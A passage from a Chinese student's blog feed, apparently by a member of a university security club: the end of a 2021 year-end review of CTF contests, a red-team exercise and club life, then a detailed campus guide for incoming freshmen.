src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%BF%8D%E7%AC%91.jpg"></p><p>不知不觉就成了协会的老人，今年六七月份又要送走 18 级的师傅们。每次都是悄悄的大家就走了，第一次送 16 级的时候大一，不懂怎么面对，一个人 emo 了很久，现在想想，毕业了又有什么关系呢，他们永远都是我的师傅跟学长学姐，不管在哪高就，我们各自努力，峰顶相见。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%93%AD%E5%93%AD.png"></p><h1 id="下半年"><a href="#下半年" class="headerlink" title="下半年"></a>下半年</h1><p>下半年学技术的时间比较少，基本是晚上才有空自己看看书和视频对着调一调，没有太多收获，一是因为这个时候的我已经决定考研了，纠结了很久没想到决定下来考研只是一瞬间的事情，一部分时间花在了收集考研资料和复习高数上，二是因为当了助班（助理班主任）很忙。</p><h2 id="跟着姚老师有饭吃"><a href="#跟着姚老师有饭吃" class="headerlink" title="跟着姚老师有饭吃"></a>跟着姚老师有饭吃</h2><p>生活总是这么多姿多彩，姚老师 yyds</p><p>添福楼吃自助素食</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118030835.png" alt="无名风景"></p><p>家中干饭 + 桂林博物馆一日游</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118031000.png" alt="桂林市博物馆大门"></p><p>家中干饭告别暑假</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118031050.png" alt="微姐做的菜"></p><p>家中包饺子 + 干饭喜迎新生和新学期</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118031235.png" alt="大家一起包的饺子"></p><p>西大比赛请大伙吃日式烤肉饭</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118031433.png" alt="非常好吃的烤肉饭"></p><h2 id="招新"><a href="#招新" class="headerlink" title="招新"></a>招新</h2><p>首先放上贵协的 2021 招新宣传片，点击直达：<a href="https://www.bilibili.com/video/BV1V44y1879A">【桂林电子科技大学】信息安全协会2021招新宣传视频</a></p><iframe src="//player.bilibili.com/player.html?aid=975227132&bvid=BV1V44y1879A&cid=397554178&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><p>今年招到了三个学弟两个学妹，感觉都挺聪明的，人也挺好的，就是有点喜欢摆烂。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%BC%80%E6%91%86.png"></p><h2 id="助班生活"><a href="#助班生活" class="headerlink" title="助班生活"></a>助班生活</h2><p>当助班是大一就有的想法，现在也终于过了面试当上了。那么为什么想要当助班呢？</p><p>一是受我当时助班的影响，觉得这确实是件比较有意义的事情，二是转专业来三院以后没有交到信安专业外的朋友，这是个认识新朋友的好机会。</p><p>那么实际情况如我所愿了吗？</p><p>只能说如愿了 90 %，其实受网络上摆烂和躺平风气的影响，加上现在各个家庭里面生活条件好了，都是少爷小姐，现在的年轻人真的挺难听进去别人说的话的。不过好在我本来也没打算去说太多大道理，相比较让大家“口服”，我更希望大家“心服”，所以犯错、挂科、逃课逃晚自习我都不说，相比较其他班也很少抓，我只会跟大家说清楚奖惩情况，毕竟都是成年人了，做事想不清楚没关系，犯错挨叼、承担后果了就知道吸取教训了。而躺平这一点让我感触最深的是在一次其他社团聚餐上，问新来的几个 21 级新生以后打算做什么工作，几乎都是回答想考公务员或者考研，极少数想进大厂，感觉跟我大一那年是相反的情况。</p><p>对我带过的两个班来说，自我感觉是尽心尽力了，能做的能说的都做了说了，虽然还是没啥反馈也一堆人挂科摆烂，只能是希望大伙有一天会突然开窍吧，反正下个学期肯定是全身心投入考研了，自然是没太多时间管了。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/emo.gif"></p><p>想认识新朋友倒是挺成功，当助班以后认识了很多同级的“同事”，跨年还收到了礼物，挺开心的。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118034749.png" alt="跨年"></p><h2 id="深夜奇遇"><a href="#深夜奇遇" class="headerlink" title="深夜奇遇"></a>深夜奇遇</h2><blockquote><p>2022.1.16 更新 ，这是一段零碎记忆，但是事后也思考了蛮久</p></blockquote><p>某一天团体辅导后跟新哥带小班去后街吃宵夜喝酒，十二点多打算走的时候，突然有一对情侣把我们拦住，那个女孩子醉得胡言乱语缩在一个店铺门口的角落，男生求我们送那女孩子回宿舍。本来是不打算多管闲事的，但是确实夜深人静店铺都关门了，有点不安全，想着能做点好事就做点好事，就答应了。</p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E8%A2%AB%E8%BF%AB%E8%90%A5%E4%B8%9A.gif" alt="" style="zoom: 67%;" /><p>最离谱的来了，一路上这个女孩子就一直说那男的怎么怎么不喜欢她，不公开也对两个人的事也不上心，非常冷漠，还说自己是很卑微很卑微的舔狗，只有喝醉了才敢说这些话，那男生就跟着后面走，估计也是喝了点，不怎么说话，就一直说“今晚你喝醉了你说什么我都不会放在心上的”。一开始感觉像是渣男骗了小妹妹的感情，但是两个人越说越多，女孩子说自己前几天才刚跟另一个学长分手，跟学长在一起得很快分手也很快， 以为对方很喜欢她结果发现是在骗她感情，分手后又马上跟现在这男生在一起了一个星期。一问年级，发现两个都是大一刚来的小屁孩，还是同班同学来的，刚大一就喝酒到半夜，搞这种事情，要是我带的新生我高低得整两句。</p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E7%A5%9E%E7%BB%8F%E7%97%85.jpg" alt="" style="zoom:67%;" /><p>最后走到宿舍门口，这两个人突然说要谈谈心，跑宿舍门口的停车场找个地方坐了下来就叫我们走，我们直接当场异或？？？？？？？加上本来跟新哥也喝了点酒，听到后面感觉没意思了，就没打算继续管他俩，扫了个车溜了。</p><blockquote><p>那么为什么这事会让我若有所思呢</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E8%8B%A5%E6%9C%89%E6%89%80%E6%80%9D.png"></p><p>第一是我对舔狗能有共情，感觉这女孩子挺可怜的，第二是觉得刚来大学的新生，本来有更多好玩的事情，非得沉迷谈恋爱，还搞得这么狼狈，好好学习不香吗，参加点社团不好玩吗，出去吃点好的在桂林玩玩景点不舒服吗，<del>高数学会了吗</del>？第三发现现在谈这种快餐恋爱实在是太容易，好像感情突然一下子就变得廉价了，唉。</p><p>后来还反思了一下自己的恋爱观，毕竟时不时也会在某个深夜 emo 一下子。</p></blockquote><h2 id="师大之旅"><a href="#师大之旅" class="headerlink" title="师大之旅"></a>师大之旅</h2><p>ctfshow 开环境重复打同一道题 + 练习输 sqlmap 指令速度，慢的罚俯卧撑 快的奖励 100 块 + 夏天全身军训服 + 宾馆变宿舍（无床上用品）。</p><p>纯纯坐牢几天，不想过多评价，只能说师大的妹妹真好看，食堂真好吃，校园真大，纪念品有点贵。</p><h2 id="西大奇安信杯"><a href="#西大奇安信杯" class="headerlink" title="西大奇安信杯"></a>西大奇安信杯</h2><p>这回不是参赛选手，但是看学弟们坐牢也挺难受的。去年是打 CTF，没想到今年直接变打靶机渗透，搞得二进制学弟直接变饮水机管理员，打 web 的学弟也没怎么打过靶机，只能是现学现卖。</p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%BF%8D%E7%AC%91.jpg"  /><p>但是也不完全是坏事，学弟们自闭回来勤奋了好多，希望明年不管是 CTF 还是打靶机都能拿好成绩。</p><h2 id="教育护网"><a href="#教育护网" class="headerlink" title="教育护网"></a>教育护网</h2><p>很幸运能在进入考研复习前还能打一次护网，这回摸进了内网，成绩也比较可以，有三等奖和 1000 块，不幸的是我到的第二天就开始感冒发烧，一个同队师傅提前回学校准备考试。</p><p>这回收获很多，首先是感受到了广职门口的夜市生活，吃到了还可以的猪肚鸡、烤鱼和炒螺。最让人惊讶的是，那边的烤鱼价格被同行们卷到 28 块一条。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118041423.png" alt="猪肚鸡"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118041653.png" alt="烤鱼"></p><p>其次是觉得这次护网的整体安排，不管是教育厅还是广职都非常的重视，从地铁站安排学生和大巴接送，到安排协议酒店、到校内场地布置、开幕式、以及配发的渗透大礼包，都能看出是有准备和设计过的，希望以后越办越好。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118042154.png" alt="欢迎入住"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118042259.png" alt="开幕式"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118042327.png" alt="渗透大礼包"></p><h2 id="第二届梦极光杯（校赛）"><a href="#第二届梦极光杯（校赛）" class="headerlink" title="第二届梦极光杯（校赛）"></a>第二届梦极光杯（校赛）</h2><p>同样，这次也不是参赛选手，而是负责整个比赛的环境搭建、运维和其他杂活。动手实操中学到了一些 docker 知识，因为害怕把正式用的服务器搭环境搭乱掉，用自己的学生机和虚拟机搭过了才敢往上实操，纯纯菜鸟。明年想出题试试，攒了一点折磨学弟的好想法。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/A60403BIEB8QRHXP%60NLRHQX.png"></p><p>协会里的学弟们挺争气，拿了线上线下双第一，赛后也及时复盘没有做出来的题目，好事，可以放心滚去考研了。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118043336.png" alt="矫情的说说"></p><blockquote><p>2022.1.15 更新</p><p>结束，准备翻上去写 2022 的目标吧</p></blockquote><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E8%B5%B0%E4%BA%86.jpg" alt="" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 年终总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新生入学攻略1.0</title>
      <link href="/posts/59594/"/>
      <url>/posts/59594/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>这篇文章增删改查自我不知道从哪个新生群里下载的一个名为“看完再问我就自杀入学超级完整攻略”的文档，若侵删</p><p>21 级新生都陆陆续续加入到新生群里，常见的问题就是大家的提问冗余，可能学长学姐们会被问到相同的问题好几次，为了解决这个问题，以及给新生最好的<del>游戏体验</del>入学体验，写一篇博客供新生参考</p><p>如果你是我们学校的学长学姐 \ 老师  \ 辅导员，看到了博客文章有什么意见、建议想提出，可以联系我</p><blockquote><p>Q : 1160118161</p></blockquote></blockquote><h1 id="物品篇"><a href="#物品篇" class="headerlink" title="物品篇"></a>物品篇</h1><h2 id="必带物品"><a href="#必带物品" class="headerlink" title="必带物品"></a>必带物品</h2><ul><li>人</li><li>身份证</li><li>录取通知书、准考证</li><li>生源地贷款回执单</li><li>银行卡（以后的补助、奖金都会发到学校发的那张银行卡上）</li><li>证件照实体版和电子版，实体版最好是一寸两寸的都有，各带一组，电子版也要保存好，以后肯定有用</li><li>高中档案袋（密封未拆）、团（党）员档案（包括团组织介绍信转接信等等材料）</li><li>装好行李的行李箱</li><li>现金一两百，零钱一二十</li><li>男生要带兵役登记证明（根据实际情况携带，有兵役登记证的带证，没有的上大学生征兵网导出相关的证明去当地所在武装部盖章后带来）</li><li>户口本首页以及本人页复印件若干张备用</li><li>床上 n 件套（方便就带，不方便建议网购或从家里寄过来学校，不建议在学校里面买，容易被推销的学长学姐缠上而且质量不予评价）</li><li>手机、平板、充电宝、数据线、耳机、U 盘</li><li>你不能够留在家里面的秘密</li></ul><h2 id="生活用品"><a href="#生活用品" class="headerlink" title="生活用品"></a>生活用品</h2><blockquote><p>在报到结束后，会有志愿者学长学姐到你们的宿舍，收拾好自己的行李之后，可以去买生活用品，列个清单到时候你们看自己情况去买</p><p>建议到校大家自己自备或者宿舍备一个医药箱，因为大半夜生病校医基本上是没什么人的，在大学里面一定要自己照顾好自己，特别是如果你在远方有一个牵挂着你的人，一个优秀的医药箱能够让他&#x2F;她安心很多</p><p>退烧药、感冒药、消炎药、肠胃药、风油精、藿香正气水（防中暑）、创可贴和体温计、其他药品因人而异</p></blockquote><ul><li>席子</li><li>桶、盆</li><li>蚊帐、窗帘</li><li>排插（买好点的，安全）</li><li>洗发水、沐浴露、洗面奶、肥皂、洗衣液&#x2F;洗衣粉</li><li>花露水</li><li>挂钩</li><li>夹子、衣架</li><li>牙刷、牙膏、漱口杯</li><li>洗脸毛巾、洗澡毛巾</li><li>抽纸、卷筒纸（宿舍当爹第一步）</li><li>男生带剃须刀、女生带自己的化妆包、头绳等等让自己变美的东西</li><li>吹风机</li><li>梳子（建议自带）</li><li>一把雨伞一把太阳伞（重点强调，桂林春天雨季非常久，夏天很晒很晒）</li><li>几把小锁，用来锁箱子抽屉等私人储物空间</li><li>指甲钳</li><li>拖鞋</li><li>抹布</li><li>女生懂针线活的可以买个针线包</li><li>水杯（最好是塑料的）</li><li>小台灯&#x2F;小夜灯</li><li>樟脑丸、干燥剂（放抽屉放柜子里）</li><li>其他宿舍神器去知乎里看看再去淘宝或者 pdd  买，按需购买即可</li></ul><h1 id="生活篇"><a href="#生活篇" class="headerlink" title="生活篇"></a>生活篇</h1><h2 id="学校地图"><a href="#学校地图" class="headerlink" title="学校地图"></a>学校地图</h2><p><a href="https://www.guet.edu.cn/xxjj/hjxqpmdt.htm">地图官网地址</a></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%AD%A6%E6%A0%A1%E5%9C%B0%E5%9B%BE.png" alt="学校地图"></p><h2 id="军训"><a href="#军训" class="headerlink" title="军训"></a>军训</h2><p>8 月 23 日军训，军训 14 天，军训要带防晒霜，和军训鞋垫。防晒霜不是为了防止你晒黑，是防止你晒伤，军训鞋垫可以减少你晕倒的风险，不要硬顶，也不要顶教官</p><p>有晚训，晚上一般是唱歌</p><p>会发军训服，一双鞋、一件速干迷彩短袖、一件长袖外衣、一条腰带、一个帽子，不和尺码及时换，如果换不了可以去<strong>商业街二楼裁缝店改尺寸</strong></p><p>晚上回去马上洗短袖，第二天肯定能干，别问这个问题了，如果真的下雨教官也不会为难你一定要你穿军训服</p><p>下雨也算一天，但是基本上不会下雨，根据我在桂林生活 20 年的经验</p><h2 id="宿舍"><a href="#宿舍" class="headerlink" title="宿舍"></a>宿舍</h2><ul><li><p>宿舍分为 A B C D F 区，所有宿舍都有空调</p></li><li><p>C、F、（D）区都是指纹锁，可以用指纹开门，还可以用一卡通刷卡开门，手机有 <strong>nfc</strong> 也可以导入数据刷手机开门</p></li><li><p>断电安排是周日到周四是晚上 <strong>23:15</strong> 断电，周五周六 <strong>24:00</strong> 断电，早上 <strong>6:00</strong> 通电，&#x3D;&#x3D;其中空调跟厕所灯单独供电&#x3D;&#x3D;，图书馆不通宵开放，但是有通宵的自习室，<strong>一个学期晚归三次会被记过</strong></p></li><li><p>宿舍有 4 &#x2F; 6 &#x2F; 8 人间多数为 6 人间</p></li><li><p>F 区是新宿舍每个宿舍都有单独的洗衣机，B 区某些宿舍也是单独洗衣机，普遍的是一个楼层俩洗衣机，一楼有洗衣房，还有烘干机和洗鞋机</p></li><li><p>床铺为 <strong>0.9 * 2</strong> 米</p></li><li><p>有 5G 网络，可以自己办宽带，见电话卡选择</p></li></ul><h2 id="电话卡选择"><a href="#电话卡选择" class="headerlink" title="电话卡选择"></a>电话卡选择</h2><p>建议大家都办一张校园卡，第一是因为流量比较够用，第二是你在大学这边需要填电话号码的地方可以填这一张校园卡的电话号码，信息泄露的话不会牵扯到你家那边的卡，大学毕业直接解绑，第三是办校园卡可以送宽带</p><p>关于宽带和三大厂商选择问题，2021.07.30 看到消息，如果后续没有达成新的协议，又需要用宽带的话，还是建议联通，如果没有宽带的需求，随意选择</p><p>三个厂商在学校的网络情况大家都是众说纷纭，本人用的移动卡在办公室可以 4g+，电信卡在办公室就只有 3g，但是在宿舍电信卡表现良好，移动卡就又很垃圾</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%60%5B6W4EEQM0%5DRGBF5WLWJK0S.png" alt="学校关于宽带通知"></p><h2 id="怎么干饭"><a href="#怎么干饭" class="headerlink" title="怎么干饭"></a>怎么干饭</h2><h3 id="食堂"><a href="#食堂" class="headerlink" title="食堂"></a>食堂</h3><blockquote><p>写在前面，不讨论食堂的味道，我本人对学校的食堂的定位就是能吃就行，加上各地来的学生都有，口味各不相同，所以大家到校以后自己感受，还是很推荐食堂的，毕竟有保障且相对便宜</p><blockquote><p>错峰吃饭求求学弟学妹们了</p></blockquote></blockquote><p>全校一共五个餐厅，分别是：<strong>怡园餐厅</strong>、<strong>仲园餐厅</strong>、<strong>馨园餐厅</strong>、<strong>教工餐厅 * 2</strong>，其中 B、C、F 三个区的宿舍门口都有卖饭的餐点，是每天食堂做好了运到宿舍门口来卖，解决拥堵问题</p><p><strong>怡园餐厅</strong>：位于田径场旁边，距离 A、B、C 区最近，共三层</p><p>一楼是巧面馆和一餐厅，巧面馆主打面食，早点餐包，一餐厅有一家明桂米粉，其余主要是中餐晚餐</p><p>二楼是三餐厅和五餐厅还有其中一个教工餐厅，都是主打中餐和晚餐，三餐厅价格很便宜 朴素风，五餐厅装修很新，中央空调很凉快，价格也适中，教工餐厅每天到点向学生开放，因为老师有餐补，所以价格对于学生来说偏小贵</p><p>三楼是阳光小镇，都是招标来的卖各种吃的的商家，有一个大屏幕吃饭的时候可以看，电竞社会在 lol 世界赛的时候包下这个屏幕来看总决赛</p><p><strong>仲园餐厅</strong>：位于足球场和篮球场旁边，距离 D、F 区最近，共两层</p><p>一楼是普通的餐厅，什么都卖，早中晚</p><p>二楼是商家入驻，什么都有，甚至有无骨烤鱼饭</p><p><strong>馨园餐厅</strong>：位于田径场旁边，距离A、B、C 区最近，一共一层，早中晚都有卖，因为是招标来的食堂，价格比怡园贵一点</p><p><strong>商业街教工餐厅</strong>：有大排档里面那种拿个小锅点酒精灯架起来吃的小干锅，也对学生开放，其他的早中晚都有卖</p><h3 id="后街"><a href="#后街" class="headerlink" title="后街"></a>后街</h3><blockquote><p>写在前面，不过多讨论后街的东西，毕竟学校是不太支持学生去后街吃东西的，主要是安全问题，懂得都懂</p></blockquote><p>后街主要是花江村民以及外地人开的一些餐馆，什么都有，奶茶店居多，后街的超市价格很亲民，晚上吃烧烤撸串也是在后街的美食广场，有一圈的烧烤店，小型聚餐、团建也会选择去后街的店解决</p><p>健身房、酒店、网吧、ktv、台球室和麻将室后街也有，多的不说了</p><h3 id="校门口-amp-外卖"><a href="#校门口-amp-外卖" class="headerlink" title="校门口&amp;外卖"></a>校门口&amp;外卖</h3><p>校门口的餐馆一般是做外卖，也是什么都有吧，美团饿了么看看就知道了。校门口有些大一点的饭店，一般用于大型的团建、聚餐</p><h3 id="商业街"><a href="#商业街" class="headerlink" title="商业街"></a>商业街</h3><p>商业街主要是几个小超市，几家水果店，两家面包店，三个运营商、几家奶茶店、一个裁缝铺、三个文具店，价格就是市场价</p><h2 id="交通-amp-快递"><a href="#交通-amp-快递" class="headerlink" title="交通&amp;快递"></a>交通&amp;快递</h2><h3 id="出校"><a href="#出校" class="headerlink" title="出校"></a>出校</h3><p>学校出山一共两种公交车，分别是 <strong>13路桂电专线</strong> 跟<strong>116路</strong>，13 路区间为花江校区门口——金鸡岭校区门口，116 路区间为花江校区门口——八里街车场（途径桂林北站）</p><blockquote><p>要去桂林什么景点玩或者去其他地方直接用地图软件搜，有详细的公交车路线方案，但是绕不开的就是出山的 13 路和 116 路</p></blockquote><h3 id="校内"><a href="#校内" class="headerlink" title="校内"></a>校内</h3><p>校内交通分为自购电动车、自购自行车、共享电动车、共享自行车、校园小巴士、步行🚶‍，一共六种解决方案</p><blockquote><p>其中不建议进校直接购买电动车，第一是牌照问题，第二是政策问题，学校可能之后会发布相关的政策限制自购电动车，因为学校里面实在是太多太多太多电动车了，甚至已经影响到日常交通了</p></blockquote><h3 id="快递"><a href="#快递" class="headerlink" title="快递"></a>快递</h3><blockquote><p><strong>快递地址：广西壮族自治区桂林市灵川县桂林电子科技大学花江校区</strong></p></blockquote><p>任何快递到了都会给你发短信，随便找找就能找到</p><p>一共两个菜鸟驿站，一个在后街一个在怡园餐厅旁边，app 可以查到</p><p>京东跟邮政在怡园餐厅的菜鸟驿站旁边</p><p>顺丰跟百世在进后街右转 200 米处</p><p>韵达在进后街左转的美食广场里，有路标</p><p>拼多多买的东西寄的极兔、熊猫等等小牌子快递在后街电影院楼下</p><h2 id="锻炼身体"><a href="#锻炼身体" class="headerlink" title="锻炼身体"></a>锻炼身体</h2><p>学校有一个田径场，田径场旁边是一片篮球场，篮球场旁边有几个乒乓球台，田径场旁边有几个排球场</p><p>实训中心旁边有一个游泳馆，游泳馆旁边有一片网球场</p><p>球类馆里面有两个篮球场，很多个乒乓球桌，很多个羽毛球场，一个小型健身房，球类馆去往 D 区小道路上有一片网球场</p><p>彩虹大道旁边有一个足球场但不是标准场，足球场旁边有一片篮球场</p><h1 id="学习篇"><a href="#学习篇" class="headerlink" title="学习篇"></a>学习篇</h1><h2 id="图书馆"><a href="#图书馆" class="headerlink" title="图书馆"></a>图书馆</h2><p>华南最大的图书馆之一，非假期晚上十点半左右闭馆，早上开门肯定在你起床之前，内有咖啡厅和会议室，环境冬暖夏凉 空调全天候开放，领导说图书馆开一天空调费用上万</p><p>入学后几天有图书馆考试，考试通过可以用一卡通入馆、借书</p><p>馆内有查图书的电脑，借书流程一般是在电脑上查找有没有你要的书，然后看图书的定位在哪，拿书，刷卡借书，一气呵成</p><h2 id="选课-amp-买书-amp-上课-amp-考试"><a href="#选课-amp-买书-amp-上课-amp-考试" class="headerlink" title="选课&amp;买书&amp;上课&amp;考试"></a>选课&amp;买书&amp;上课&amp;考试</h2><p>大一上不用选课也不用买书，上课都是跟同班、隔壁班同学一起上，辅导员会帮你安排好，大一下开始在教务系统自由选课，买书也有官方的平台，买的是新书，但是推荐去找学长学姐或者二手书店收旧书。</p><p>课表上教室的格式一般都是<strong>教学楼号 + 教室号</strong>，比如：<strong>17204</strong> 就表示在<strong>第十七教学楼的 204 号教室</strong>，现在有空调的教学楼是十六教还有一教高楼，其他教室均有大电风扇</p><p><strong>考试不再有期末考试的概念，都叫做结课考试</strong>，大学上课有平时分占比，不是最后考试多少分最后总评就是多少分，<strong>平时分大部分由到课率、作业完成情况和老师印象组成</strong>，有些课会有中国慕课上的网课，这也是算在平时分里面，<strong>不是所有课程结课都是在学期期末</strong>，可能有些课上八周，有些上十周，有些上十六周，一般结课考试安排在结课后两周，<strong>希望大家不要挂科好好学习</strong></p><blockquote><p><strong>希望大家都好好上课，如果你要翘课，衡量一下翘课之后你要干的事情和上课的重要性，做出不让自己后悔的选择</strong></p><p><strong>选课选哪个老师这个问题可以问一下学长学姐，选个比较好的老师比较方便，学得好会给你比较高的分，学得不好老师也会拼命去捞你的那种</strong></p></blockquote><h2 id="转专业"><a href="#转专业" class="headerlink" title="转专业"></a>转专业</h2><p>转专业最常见两种，第一是学业优秀学生转专业，第二是特长生转专业</p><ul><li>20 级学业优秀转专业的要求是学分绩在年级排名前 30%，且对高数成绩有要求</li><li>20 级特长生转专业的要求是获得过跟想要去的那个专业相关的，省部级二等奖以上的奖，<strong>或者</strong>是有明确能够证明你对那个专业有特长的材料</li></ul><p>每年转专业的政策都在变，进学校以后可以去本科教育服务网找转专业的相关资料，需要连接校园网才能进，<a href="http://utsc.guet.edu.cn/">网址点这里</a></p><h1 id="社团篇"><a href="#社团篇" class="headerlink" title="社团篇"></a>社团篇</h1><blockquote><p>社团排名不分先后，都是好玩的</p><blockquote><p>2021.08.02</p><p>有很多社团的简介还没写上来，三院是有很多社团的，后面也会慢慢更新</p></blockquote></blockquote><h2 id="生活类社团"><a href="#生活类社团" class="headerlink" title="生活类社团"></a>生活类社团</h2><h3 id="N-D-C-核舞器"><a href="#N-D-C-核舞器" class="headerlink" title="N.D.C 核舞器"></a>N.D.C 核舞器</h3><p>N.D.C 核舞器是计算机与信息安全学院校团委管理下的一支院级队伍，在学院的支持与帮助下，取得了不少进步与发展，我们每一位成员都能清晰地认识舞蹈队的职责：积极参加学院组织的各类活动演出，代表学院参加校级舞蹈大赛、快闪比赛，在舞台上展现自我，展现出对舞蹈的热爱和追求，我们还会不间断参与各学院队伍之间的交流。</p><p>我们舞蹈队以培养基础为主，让大家不断提升自己，在队内大家可以跟学长学姐学习舞蹈，也可以根据自己的兴趣自学舞蹈，<strong>队内会定期举行考核</strong>，通过这样的方式，督促大家，提高练舞的积极性，并促进队内的交流，有利于提高整体水平，让大家都能保持一个良好的身体协调性。</p><blockquote><p>招新群号：444135141</p></blockquote><h2 id="科技类社团"><a href="#科技类社团" class="headerlink" title="科技类社团"></a>科技类社团</h2><h3 id="大学生科技协会（科协）"><a href="#大学生科技协会（科协）" class="headerlink" title="大学生科技协会（科协）"></a>大学生科技协会（科协）</h3><p>三院科协是依托于计算机与信息安全学院，面向全校的校级技术社团。我们的活动包括技术学习，承办和策划各类科技赛事和颁奖仪式，组织创新创业训练等。科协设有软件部、硬件部、多媒体部、组织部四个部门，致力于对成员技术能力以及创新能力的培养。</p><p>在科协，你不仅能提高自身的技术，结交志同道合的朋友，还能收获前辈的悉心指导，共享优质的资源服务。</p><p>科协的大门将为你们敞开，我们期待你们的到来，欢迎与我们一起畅游在技术的海洋！</p><blockquote><p>招新群号：860651675</p><p>招新网址：<a href="https://hello.kexie.space/">https://hello.kexie.space/</a></p></blockquote><h3 id="信息安全协会"><a href="#信息安全协会" class="headerlink" title="信息安全协会"></a>信息安全协会</h3><p>桂电信息安全协会 GUETSEC 隶属于桂电网络信息中心，最初于 2013 年由几名网络安全爱好者组成，是一个大型跨校区社团。我们专注于 web 安全、二进制安全、逆向破解、密码学和区块链等方向的研究。</p><p>我们不强求每位成员的学习方向，贯彻自由、平等、共享的精神，我们常组队参加各大安全赛事且取得了不错的成绩，在广西高校中一直是数一数二的，但是在全国来看并不理想，单与其他三所电子科技大学相比，差距就很大。所以我们一直在努力向全国的安全强校看齐，拉近距离。</p><p>我们需要每一批新鲜血液共同努力，一起建设我校的信安和网安专业，非常欢迎志同道合的朋友加入我们的团队！</p><blockquote><p>招新群号：852371638</p><p>官方 CTF 做题平台：<a href="http://82.156.18.42/">http://82.156.18.42/</a></p></blockquote><h3 id="七星瓢虫工作坊"><a href="#七星瓢虫工作坊" class="headerlink" title="七星瓢虫工作坊"></a>七星瓢虫工作坊</h3><p>七星瓢虫工作坊成立于 2014 年，是主攻信息安全方向的一个科技类社团，目前主要的研究方向有 web 安全，逆向分析，二进制安全等等。我们和多家安全公司有着长期合作关系，在这里你可以更早了解到公司的需求，以便明确自己的学习方向。</p><p>当然，在瓢虫的大家庭里，你不仅可以与许多大佬互相交流，不断的学习技术，提升自己的实力，还可以交到许多志同道合的朋友。在瓢虫里相互督促，互相帮助，共同分享学习经验，一同感受交流产生的火花吧！</p><p>Action speak louder than words ! 行动胜于言语！我们渴望真正热爱信息安全事业，有强烈进取心，强烈好奇心，超强动手能力，具有分享精神的小伙伴，加入我们，一同建设瓢虫大家庭。我相信，只要你肯努力并做出行动，未来就一定是属于你的！</p><blockquote><p>招新群号：935761165</p></blockquote><h3 id="信息安全维护小组"><a href="#信息安全维护小组" class="headerlink" title="信息安全维护小组"></a>信息安全维护小组</h3><p>三院信息安全维护小组成立于2008年3月，是一个在学院团委指导下的科技型院级社团，致力于为全校同学提供学习、交流、研究信息安全、安全编程、大数据分析与挖掘、后端开发等方向的综合平台。我们本着以学习网络信息安全知识为基础，以技术维护信息安全为宗旨的原则，努力提升自身技能，增强团队协作能力，寻求适合自己的发展方向。</p><p>社团会通过组织成员参与各类信息安全竞赛来获取实践经验，并鼓励成员利用所学专业知识进行深层次的安全研究。</p><p>无论你对这个领域是初窥堂奥亦或是不甚了了，只要你对安全充满兴趣，满怀热情和求知，都可以在信安小组找到属于自己的安全小天地！</p><blockquote><p>招新群号：615072802</p></blockquote><h3 id="穿山甲安全纵队"><a href="#穿山甲安全纵队" class="headerlink" title="穿山甲安全纵队"></a>穿山甲安全纵队</h3><p>穿山甲安全纵队（Pangolin），又称穿山甲，取其可攻可守，攻守兼备之意。</p><p>穿山甲安全纵队由丁勇教授指导负责，主攻信息安全方面，包括但不限于 渗透测试、网络攻防、算法研究、逆向破解、二进制安全，工控安全，移动安全。</p><p>我们团队在指导老师丁勇教授的帮助和学院的支持下，联合合天智汇信息技术有限公司、绿盟科技以及深信服科技等知名网络安全公司，举办了‘合天杯’、‘绿盟杯’、‘深信服杯’等多个 CTF 夺旗赛并取得优异的成绩。更有优秀的学长学姐去到 360 等大企业实习工作。</p><p>本团队学习氛围浓厚，风气开放自由，倡导探索与实践精神。穿山甲的创立，就是为热爱信息安全的“道友”们提供一个学习交流的平台，共同探索“信安之道”！</p><blockquote><p>招新群号：836214373</p></blockquote><h3 id="天涯社区人才培养基地"><a href="#天涯社区人才培养基地" class="headerlink" title="天涯社区人才培养基地"></a>天涯社区人才培养基地</h3><p>天涯社区人才培养基地创建于 2010  